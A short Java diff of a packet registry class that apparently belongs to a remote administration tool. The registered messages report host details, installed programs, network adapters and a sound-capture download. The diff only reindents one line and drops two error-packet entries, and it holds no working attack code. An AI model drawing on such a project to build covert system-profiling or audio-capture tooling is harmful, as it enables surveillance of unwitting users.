@@ -27,7 +27,7 @@ public class IncomingPackets {
 		PACKETS_INCOMING.put((short) 9, Packet9InitJavaVersion.class);
 		PACKETS_INCOMING.put((short) 10, Packet10InitInstallPath.class);
 		PACKETS_INCOMING.put((short) 11, Packet11InitInstallationDate.class);
-		PACKETS_INCOMING.put((short) 12, Packet12InitLocalAddress.class);
+    	PACKETS_INCOMING.put((short) 12, Packet12InitLocalAddress.class);
 		PACKETS_INCOMING.put((short) 13, Packet13InitTotalMemory.class);
 		PACKETS_INCOMING.put((short) 14, Packet14InitAvailableCores.class);
 		PACKETS_INCOMING.put((short) 15, Packet15InitJavaPath.class);
@@ -46,8 +46,6 @@ public class IncomingPackets {
 		PACKETS_INCOMING.put((short) 55, Packet55InstalledProgram.class);
 		PACKETS_INCOMING.put((short) 56, Packet56NetworkAdapter.class);
 		PACKETS_INCOMING.put((short) 58, Packet58ServerDownloadSoundCapture.class);
-		PACKETS_INCOMING.put((short) 60, Packet60Error.class);
-		PACKETS_INCOMING.put((short) 65, Packet65ErrorLog.class);
 	}
 
     /**
